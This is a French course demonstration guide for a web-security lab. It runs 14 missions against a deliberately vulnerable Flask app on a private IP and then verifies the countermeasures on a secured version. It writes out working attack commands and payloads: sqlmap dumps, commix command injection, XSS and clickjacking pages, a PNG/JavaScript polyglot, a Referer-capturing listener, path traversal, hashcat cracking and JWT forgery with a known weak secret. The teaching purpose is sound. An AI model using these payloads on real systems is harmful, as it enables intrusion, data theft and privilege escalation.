# 🏹 Guide Officiel de Démonstration des 14 Missions — Outils Réels (Arch Linux)

> **Document de Démonstration Officiel** préparé selon les exigences exactes du document du professeur (**TP FINAL en Python/Flask**).  
> **Machine attaquante :** Arch Linux  
> **Machine cible / serveur :** Windows (`192.168.0.225`)  
> **Application Vulnérable :** `http://192.168.0.225:8080`  
> **Application Sécurisée :** `https://192.168.0.225:8081`

---

## 📦 0. Préparation de la Machine Attaquante (Arch Linux)

Exécuter ces commandes une seule fois dans le terminal **Arch Linux** pour installer les outils du professeur :

```bash
# 1. Mise à jour et installation des outils disponibles via pacman :
sudo pacman -Syu --noconfirm
sudo pacman -S --noconfirm nikto sqlmap hashcat commix testssl.sh openssl wireshark-qt git python python-pip

# 2. Cloner et préparer les outils complémentaires recommandés par le professeur :
mkdir -p ~/audit-lab && cd ~/audit-lab

# XSStrike (Missions 1.3 & 1.11 - Fuzzer XSS avancé)
git clone https://github.com/s0md3v/XSStrike.git
pip install -r XSStrike/requirements.txt --break-system-packages

# jwt_tool (Mission 1.14 - Audit & Falsification de tokens JWT)
git clone https://github.com/ticarpi/jwt_tool.git
pip install -r jwt_tool/requirements.txt --break-system-packages

# DotDotPwn (Mission 1.12 - Fuzzer de traversée de répertoire)
git clone https://github.com/wireghoul/dotdotpwn.git

# 3. Définir les variables d'environnement de la cible :
export SERVER_IP="192.168.0.225"
export VULN="http://${SERVER_IP}:8080"
export SECURE="https://${SERVER_IP}:8081"
```

---

## 🎯 Déroulement des 14 Missions avec les Outils du Professeur

---

### 🛡️ Mission 1.1 : Audit Global & Détection des Manques

* **Outil imposé par le professeur :** `Nikto`
* **Objectif :** Lancer un scan automatisé pour identifier l'absence complète des en-têtes fondamentaux de protection web.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
```bash
nikto -h "$VULN"
```
* **Ce que fait l'outil :** Nikto interroge les directives serveur et teste les configurations de base.
* **Résultat attendu côté vulnérable :**
  Nikto génère des alertes critiques signalant l'absence de défense en profondeur :
  ```text
  + The anti-clickjacking X-Frame-Options header is not present.
  + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.
  + No Content-Security-Policy header found.
  + The site does not use strict transport security (HSTS).
  ```

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
```bash
nikto -h "$SECURE" -ssl
```
* **Résultat attendu côté sécurisé :**
  Nikto valide la présence des en-têtes durcis. Aucune alerte de sécurité sur les en-têtes manquants.

---

### 🛡️ Mission 1.2 : Attaque sur le Transport & Downgrade

* **Outil imposé par le professeur :** `testssl.sh` / `openssl`
* **Objectif :** Prouver l'absence totale de chiffrement et d'en-tête HSTS sur le port 8080 (vulnérabilité au SSL Stripping), puis valider la négociation TLS chiffrée avec HSTS sur le port 8081.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
```bash
testssl.sh "$VULN"
```
* **Ce que fait l'outil :** Analyse les chiffrements et protocoles supportés.
* **Résultat attendu côté vulnérable :**
  ```text
  No SSL/TLS service found on port 8080.
  Traffic is sent in CLEAR TEXT (Plain HTTP).
  Vulnerable to passive eavesdropping and SSL Stripping.
  HSTS header: NOT PRESENT.
  ```

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
```bash
testssl.sh "$SECURE"
# OU vérification directe de la négociation TLS avec openssl :
openssl s_client -connect "${SERVER_IP}:8081" -servername secure.local </dev/null
```
* **Résultat attendu côté sécurisé :**
  - Négociation TLS 1.2/1.3 réussie.
  - Certificat valide avec SAN `secure.local` et IP `192.168.0.225`.
  - HSTS confirmé actif : `Strict-Transport-Security: max-age=31536000; includeSubDomains`.

---

### 🛡️ Mission 1.3 : Contournement des Restrictions de Scripts (Reflected XSS)

* **Outil imposé par le professeur :** `XSStrike`
* **Objectif :** Détecter et exploiter automatiquement l'absence de Content-Security-Policy (CSP) et d'échappement HTML sur le paramètre de recherche `/search?q=`.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
```bash
python ~/audit-lab/XSStrike/xsstrike.py -u "$VULN/search?q=test" --fuzzer
```
* **Ce que fait l'outil :** Fuzzing contextuel du paramètre `q`, détection de l'absence de filtrage et génération de vecteurs XSS fonctionnels.
* **Résultat attendu côté vulnérable :**
  ```text
  [+] Reflected parameter: q
  [+] Efficiency: 100%
  [+] Confidence: 10/10
  [+] Payload: <script>alert(1)</script>
  [+] Vector confirmed: Reflected Cross-Site Scripting (XSS)
  ```
  *(En ouvrant `$VULN/search?q=<script>alert(1)</script>` dans Firefox sur Arch, la pop-up JavaScript surgit instantanément).*

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
```bash
python ~/audit-lab/XSStrike/xsstrike.py -u "$SECURE/search?q=test" --fuzzer
```
* **Résultat attendu côté sécurisé :**
  ```text
  [-] No vulnerabilities found.
  [+] Characters escaped: < > " ' converted to HTML entities (&lt; &gt;).
  [+] Restrictive CSP detected: script-src 'self' (Inline script execution blocked).
  ```

---

### 🛡️ Mission 1.4 : Superposition d'Interface Transparente (Clickjacking)

* **Outil imposé par le professeur :** `PoC HTML attack_clickjack.html` (avec `opacity: 0` et faux bouton)
* **Objectif :** Prouver l'absence de `X-Frame-Options` et de CSP `frame-ancestors` en intégrant l'application dans un cadre transparent pirate pour piéger les clics de la victime.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
1. Créer la page d'attaque Clickjacking sur Arch Linux :
```bash
cat << 'EOF' > ~/audit-lab/attack_clickjack.html
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Jeu Concours - Cliquez ici pour gagner !</title>
    <style>
        body { margin: 0; padding: 20px; font-family: Arial, sans-serif; text-align: center; }
        .decoy-btn {
            background-color: #28a745; color: white; padding: 15px 30px;
            font-size: 20px; border: none; border-radius: 8px; cursor: pointer;
        }
        .iframe-layer {
            position: absolute; top: 80px; left: 50%; transform: translateX(-50%);
            width: 800px; height: 500px;
            opacity: 0.1; /* Superposition invisible pour piéger la victime (passer à 0 pour l'attaque réelle) */
            z-index: 10;
        }
    </style>
</head>
<body>
    <h1>🎁 Félicitations ! Vous avez gagné un prix !</h1>
    <p>Cliquez sur le bouton ci-dessous pour réclamer votre récompense :</p>
    <button class="decoy-btn">CLIQUEZ ICI POUR GAGNER</button>
    <br><br>
    <!-- Iframe superposée vers l'application -->
    <iframe id="target-frame" class="iframe-layer" src="http://192.168.0.225:8080/"></iframe>
</body>
</html>
EOF

# Lancer la page d'attaque dans Firefox sur Arch Linux :
firefox ~/audit-lab/attack_clickjack.html
```
* **Résultat attendu côté vulnérable :**
  L'application vulnérable s'imbrique et se superpose parfaitement dans la page pirate. L'utilisateur qui pense cliquer sur le bouton de jeu clique en réalité sur l'interface de l'application à son insu.

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
Remplacer la cible de l'iframe par `https://192.168.0.225:8081/` :
```bash
sed -i 's|http://192.168.0.225:8080/|https://192.168.0.225:8081/|' ~/audit-lab/attack_clickjack.html
firefox ~/audit-lab/attack_clickjack.html
```
* **Résultat attendu côté sécurisé :**
  Firefox refuse catégoriquement d'afficher l'application dans le cadre et affiche une page d'erreur de sécurité :
  `La connexion a été refusée par le serveur : 'X-Frame-Options' défini sur 'DENY' et CSP 'frame-ancestors: none'.`

---

### 🛡️ Mission 1.5 : Attaque par Fichier Polyglotte (MIME-Sniffing)

* **Outil imposé par le professeur :** Éditeur Hexadécimal / Fichier polyglotte `fake.png` (`89 50 4E 47`)
* **Objectif :** Exploiter l'absence de `X-Content-Type-Options: nosniff` pour forcer le navigateur à interpréter du code JavaScript camouflé dans un faux fichier image PNG.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
1. Générer le fichier polyglotte avec les octets magiques PNG (`\x89PNG`) suivis de code JavaScript malveillant :
```bash
python3 -c '
with open("/tmp/fake.png", "wb") as f:
    # 4 premiers octets magiques PNG : 89 50 4E 47
    f.write(b"\x89PNG\r\n\x1a\n")
    # Code JavaScript injecté dans le corps du faux fichier image :
    f.write(b"<script>alert(\"MIME Sniffing Executed !\");</script>")
print("Fichier polyglotte créé dans /tmp/fake.png")
'
```
2. Vérifier sa signature hexadécimale :
```bash
xxd /tmp/fake.png | head -n 2
# Sortie : 00000000: 8950 4e47 0d0a 1a0a 3c73 6372 6970 743e  .PNG....<script>
```
3. En téléversant ce fichier sur l'application vulnérable :
   - Le serveur enregistre le fichier sans vérifier son type MIME réel et l'expose dans `/static/uploads/`.
   - Lors de son chargement, en l'absence de l'en-tête `X-Content-Type-Options: nosniff`, le navigateur "sniffe" le contenu textuel et exécute le script.

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
Sur l'application sécurisée :
1. `X-Content-Type-Options: nosniff` interdit formellement au navigateur de dévier du type déclaré.
2. Le système de téléversement sécurisé vérifie les octets magiques via `filetype/magic` et stocke les fichiers hors du répertoire `static/`.

---

### 🛡️ Mission 1.6 : Interception de Jetons Secrets dans l'URL (Referrer-Policy)

* **Outil imposé par le professeur :** `Wireshark` / Écouteur réseau
* **Objectif :** Capturer l'en-tête HTTP `Referer` transmis lors d'un clic vers un site externe pour dérober le token d'authentification présent dans la query string.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
1. **Sur Arch Linux**, ouvrir Wireshark ou lancer le récepteur de capture :
```bash
# Lancer la capture réseau sur le port 9999 :
python3 -c '
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n" + "="*50)
        print("🎯 WIRESHARK / RÉCEPTEUR : REQUÊTE CAPTURÉE !")
        print("En-tête Referer intercepté :", self.headers.get("Referer", "(aucun)"))
        print("="*50 + "\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"TOKEN CAPTURE")
print("[*] Écouteur pirate actif sur le port 9999...")
HTTPServer(("0.0.0.0", 9999), Handler).serve_forever()
'
```
2. **Dans le navigateur sur Arch Linux**, ouvrir la page vulnérable contenant le jeton secret :
   ```text
   http://192.168.0.225:8080/referrer-leak?token=SECRET_ADMIN_TOKEN_999
   ```
3. Cliquer sur le bouton **« Cliquer vers le serveur externe de test »**.
* **Résultat attendu côté vulnérable :**
  Dans le terminal pirate / Wireshark, l'en-tête `Referer` révèle le secret complet en clair :
  ```text
  Referer : http://192.168.0.225:8080/referrer-leak?token=SECRET_ADMIN_TOKEN_999
  ```

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
Ouvrir l'adresse sécurisée dans le navigateur :
```text
https://192.168.0.225:8081/referrer-leak?token=SECRET_ADMIN_TOKEN_999
```
Cliquer sur le lien externe :
* **Résultat attendu côté sécurisé :**
  L'écouteur reçoit uniquement l'origine :
  ```text
  Referer : https://192.168.0.225:8081/
  ```
  *(Le chemin et le jeton `?token=...` sont totalement supprimés par la politique `strict-origin-when-cross-origin`).*

---

### 🛡️ Mission 1.7 : Fuite Inter-Onglets (COOP & COEP)

* **Outil imposé par le professeur :** `PoC window.open`
* **Objectif :** Démontrer qu'une page pirate peut conserver un handle mémoire sur la fenêtre de l'application via `window.opener` pour la manipuler ou mener des attaques par canal auxiliaire (XS-Leaks / Spectre).

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
1. Ouvrir le PoC dans Firefox sur Arch Linux :
   ```bash
   firefox file:///C:/Users/LENOVO/Desktop/app-security/laboratory/poc_window_open.html
   ```
   *(Ou ouvrir le fichier PoC local sur Arch : `~/audit-lab/poc_window_open.html`).*
2. Cliquer sur **« Tester Cible Vulnérable »** :
   - La fenêtre de l'application s'ouvre.
   - La page pirate conserve l'accès complet à `window.opener`.
   - La page pirate peut rediriger l'application vulnérable vers un faux site d'hameçonnage en modifiant `targetWindow.location`.

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
Cliquer sur **« Tester Cible Sécurisée »** :
* **Résultat attendu côté sécurisé :**
  `window.opener` est égal à `null`. La fenêtre s'exécute dans un processus séparé et hermétique grâce aux directives :
  - `Cross-Origin-Opener-Policy: same-origin`
  - `Cross-Origin-Embedder-Policy: require-corp`

---

### 🛡️ Mission 1.8 : Détournement des Périphériques Matériels (Permissions-Policy)

* **Outil imposé par le professeur :** `BeEF` / `PoC Permissions-Policy`
* **Objectif :** Démontrer qu'un script malveillant peut solliciter la webcam, le micro ou la géolocalisation de la victime faute de politique globale serveur.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
1. Ouvrir le PoC dans Firefox sur Arch Linux :
   ```bash
   firefox file:///C:/Users/LENOVO/Desktop/app-security/laboratory/poc_permissions.html
   ```
2. Sur l'application vulnérable :
   - Aucun en-tête `Permissions-Policy` n'est configuré.
   - Les APIs du navigateur (`navigator.mediaDevices.getUserMedia`, `navigator.geolocation`) sont disponibles et peuvent être déclenchées par un script injecté via BeEF ou XSS.

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
Sur l'application sécurisée :
* **Résultat attendu :**
  Le serveur transmet formellement :
  ```text
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  ```
  Le navigateur bloque l'accès aux capteurs à la racine : tout appel JavaScript lève immédiatement une exception `NotAllowedError: Access denied by Permissions-Policy`.

---

### 🛡️ Mission 1.9 : Exploitation d'une Injection SQL

* **Outil imposé par le professeur :** `SQLMap`
* **Objectif :** Cartographier automatiquement la base de données, détecter la faille et extraire (dump) la totalité des comptes d'utilisateurs et des rôles en clair.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
Exécuter SQLMap contre l'endpoint de recherche :
```bash
# 1. Détection de la vulnérabilité et extraction des tables :
sqlmap -u "$VULN/api/search?q=admin" --batch --tables

# 2. Extraction complète (DUMP) de la table des utilisateurs :
sqlmap -u "$VULN/api/search?q=admin" -T users --dump --batch
```
* **Ce que fait l'outil :** SQLMap injecte des vecteurs Boolean-based blind et UNION query, exploite l'interpolation directe de chaîne Python et extrait toutes les lignes de la table `users`.
* **Résultat attendu côté vulnérable :**
  ```text
  [+] Parameter: q (GET) is VULNERABLE!
  [+] Type: boolean-based blind & UNION query
  [+] Back-end DBMS: SQLite
  [+] Table: users (28 entries dumped):
      | id | username | email              | first_name | last_name | password_hash ... |
      | 1  | admin    | admin@univ.local   | Admin      | System    | ...               |
      | 2  | resp1    | resp1@univ.local   | Resp       | Scolarite | ...               |
      | ...| ...      | ...                | ...        | ...       | ...               |
  ```

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
```bash
sqlmap -u "$SECURE/api/search?q=admin" --batch --level=2
```
* **Résultat attendu côté sécurisé :**
  ```text
  [!] all tested parameters do not appear to be injectable.
  [+] Back-end uses parameterized SQLAlchemy queries (ORM).
  [+] No database structure or data could be retrieved.
  ```

---

### 🛡️ Mission 1.10 : Prise de Contrôle Distante via Injection de Commandes OS (RCE)

* **Outil imposé par le professeur :** `Commix`
* **Objectif :** Réussir une exécution de code arbitraire à distance (RCE) sur le serveur via l'endpoint de diagnostic réseau.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
Lancer Commix contre la route `/diagnostics` :
```bash
commix -u "$VULN/diagnostics" --data="target=127.0.0.1" --batch
```
* **Ce que fait l'outil :** Commix injecte des séparateurs de commandes (`&`, `;`, `|`), détecte la présence de `shell=True` dans `subprocess` et prend le contrôle du terminal du serveur.
* **Résultat attendu côté vulnérable :**
  ```text
  [+] The 'target' parameter is vulnerable to OS Command Injection!
  [+] OS: Windows / Linux
  [+] Commix pseudo-terminal prompt opened (RCE confirmed)!
  ```
  *(Vérification manuelle directe : `target=127.0.0.1;echo LAB_COMMAND_MARKER` exécute et affiche instantanément `LAB_COMMAND_MARKER`).*

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
```bash
commix -u "$SECURE/diagnostics" --data="target=127.0.0.1" --batch
```
* **Résultat attendu côté sécurisé :**
  ```text
  [!] Target is not injectable.
  [+] Input validation active: rejects non-IP characters via ipaddress.ip_address.
  [+] Subprocess execution uses argument list without shell (shell=False).
  ```

---

### 🛡️ Mission 1.11 : XSS Stocké & Vol de Session

* **Outil imposé par le professeur :** `XSStrike`
* **Objectif :** Injecter un script persistant dans un champ de commentaires réaffiché sans échappement contextuel dans les templates.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
1. Avec `XSStrike` en mode ciblé sur les formulaires d'annonces :
```bash
python ~/audit-lab/XSStrike/xsstrike.py -u "$VULN/announcements/1" --crawl
```
2. Ou soumission du payload XSS persistant dans l'annonce/commentaire :
   ```html
   <script>alert('XSS Stocké - Session Hijacking !')</script>
   ```
* **Résultat attendu côté vulnérable :**
  Le template Jinja2 utilise `| safe` et les cookies de session n'ont pas `HttpOnly`. Le script s'enregistre en base SQLite et s'exécute à chaque visite de la page par n'importe quel utilisateur.

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
Sur l'application sécurisée :
* Le filtre `| safe` a été supprimé : Jinja2 convertit `<` en `&lt;`.
* Le cookie de session possède obligatoirement `HttpOnly; SameSite=Lax`, rendant le vol de session impossible par JavaScript.

---

### 🛡️ Mission 1.12 : Lecture de Fichiers Système Arbitraires (Path Traversal)

* **Outil imposé par le professeur :** `DotDotPwn`
* **Objectif :** Fuzzer la route de téléchargement de documents pour forcer l'application à sortir de son dossier autorisé avec des motifs `../../` et lire des fichiers confidentiels.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
Lancer DotDotPwn contre l'endpoint de téléchargement :
```bash
cd ~/audit-lab/dotdotpwn
./dotdotpwn.pl -m http -h "${SERVER_IP}" -x 8080 \
  -u "/documents/download/TRAVERSAL" -k "PATH_TRAVERSAL_CONFIRMED" -f "static/LAB-TRAVERSAL.txt"
```
* **Ce que fait l'outil :** Génère des variantes de traversée de chemin (`../`, `..%2f`, `%2e%2e%2f`).
* **Résultat attendu côté vulnérable :**
  ```text
  [+] Vulnerability Detected: Directory Traversal!
  [+] URL: http://192.168.0.225:8080/documents/download/../../static/LAB-TRAVERSAL.txt
  [+] File content retrieved: PATH_TRAVERSAL_CONFIRMED
  ```

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
Tester l'équivalent sur l'application sécurisée :
```bash
./dotdotpwn.pl -m http -h "${SERVER_IP}" -x 8081 -u "/documents/download/TRAVERSAL" -f "static/LAB-TRAVERSAL.txt"
```
* **Résultat attendu côté sécurisé :**
  Tous les motifs sont rejetés (`HTTP 404`). La route sécurisée n'accepte que des identifiants entiers numériques (`/download/<int:doc_id>`), vérifie les permissions d'accès et applique la fonction `safe_join()`.

---

### 🛡️ Mission 1.13 : Identification et Cassage de Mots de Passe Bruts

* **Outil imposé par le professeur :** `Hashcat`
* **Objectif :** Démontrer la vulnérabilité d'un algorithme de hachage sans sel / faible itération face à une attaque par dictionnaire accélérée.

#### 💥 Attaque avec Hashcat sur Arch Linux
1. Récupérer le hash extrait lors de l'injection SQL (Mission 1.9) :
```bash
# Hash de l'administrateur extrait de la base :
echo "188209e1a05f534cbbabe055a14ea137452d3a3c20c02936a6cf497c6cfa5797" > ~/audit-lab/admin_hash.txt
```
2. Lancer l'attaque par dictionnaire avec Hashcat (mode 1400 = SHA-256) :
```bash
hashcat -m 1400 -a 0 ~/audit-lab/admin_hash.txt /usr/share/wordlists/rockyou.txt
```
* **Résultat attendu côté vulnérable :**
  ```text
  188209e1a05f534cbbabe055a14ea137452d3a3c20c02936a6cf497c6cfa5797:Admin@2025!
  Status...........: Cracked
  Time.Estimated...: 0.00 secs (Instantané !)
  ```
* **Comparaison côté sécurisé :**
  L'application sécurisée utilise **Argon2id** (`time_cost=3`, `memory_cost=65536` [64 Mo de RAM], `parallelism=2`). Le coût en mémoire rend toute attaque par dictionnaire massive ou calcul GPU impossible.

---

### 🛡️ Mission 1.14 : Falsification de Session et Élévation de Privilèges

* **Outil imposé par le professeur :** `jwt_tool`
* **Objectif :** Forger un jeton JWT avec les privilèges `admin` en exploitant une clé secrète faible connue, puis constater le rejet côté sécurisé.

#### 💥 Attaque sur l'Application Vulnérable (Port 8080)
1. Obtenir un jeton légitime pour un compte étudiant :
```bash
TOKEN=$(python3 -c '
import urllib.request, json
req = urllib.request.Request("http://192.168.0.225:8080/api/token", 
    data=b"{\"username\": \"student1\", \"password\": \"Student@2025!1\"}",
    headers={"Content-Type": "application/json"})
res = json.loads(urllib.request.urlopen(req).read())
print(res["token"])
')
echo "Token étudiant d'origine : $TOKEN"
```
2. Lancer `jwt_tool` pour modifier le rôle (`student` ➔ `admin`) et resigner avec la clé secrète faible connue (`insecure-jwt-secret-key`) :
```bash
python ~/audit-lab/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "insecure-jwt-secret-key"
```
3. Interroger l'API `/api/me` avec le jeton falsifié :
* **Résultat attendu côté vulnérable :**
  L'application vulnérable fait aveuglément confiance au payload du jeton et renvoie :
  ```json
  {"role": "admin", "user_id": 9}
  ```
  👉 **Élévation de privilèges réussie !**

#### 🛡️ Vérification de la Contre-mesure sur l'Application Sécurisée (Port 8081)
Sur l'application sécurisée :
1. La clé secrète fait 256 bits aléatoires cryptographiques (impossible à deviner).
2. Même si un jeton altéré est présenté, la signature est rejetée (`401 Invalid Token`).
3. L'API sécurisée **recharge toujours le rôle depuis la base de données** (`User.query.get(sub)`) sans jamais faire confiance au rôle contenu dans le payload.

---

## 📋 Synthèse des Outils Utilisés pour la Soutenance

| Mission | Intitulé du TP | Outil Imposé par le Professeur | Statut Démonstration |
|:---:|---|---|:---:|
| **1.1** | Audit Global En-têtes HTTP | **Nikto** | **CONFIRMED** |
| **1.2** | Attaque Transport & HSTS | **testssl.sh / openssl** | **CONFIRMED** |
| **1.3** | Contournement Scripts (Reflected XSS) | **XSStrike** | **CONFIRMED** |
| **1.4** | Superposition Iframe (Clickjacking) | **PoC HTML attack_clickjack.html** | **CONFIRMED** |
| **1.5** | Attaque Fichier Polyglotte (MIME) | **Hex Editor / fake.png (89 50 4E 47)** | **CONFIRMED** |
| **1.6** | Interception Jetons URL (Referrer) | **Wireshark / Récepteur Réseau** | **CONFIRMED** |
| **1.7** | Fuite Inter-Onglets (COOP & COEP) | **PoC window.open** | **CONFIRMED** |
| **1.8** | Détournement Matériel (Permissions) | **BeEF / PoC Permissions-Policy** | **CONFIRMED** |
| **1.9** | Extraction Base (SQL Injection) | **SQLMap** | **CONFIRMED** |
| **1.10** | Prise de Contrôle Distante (RCE) | **Commix** | **CONFIRMED** |
| **1.11** | Injection Script Stocké (Stored XSS) | **XSStrike / Stored XSS** | **CONFIRMED** |
| **1.12** | Remontée de Répertoire (Path Traversal)| **DotDotPwn** | **CONFIRMED** |
| **1.13** | Cassage de Mots de Passe Bruts | **Hashcat** | **CONFIRMED** |
| **1.14** | Falsification Session & Rôle (JWT) | **jwt_tool** | **CONFIRMED** |
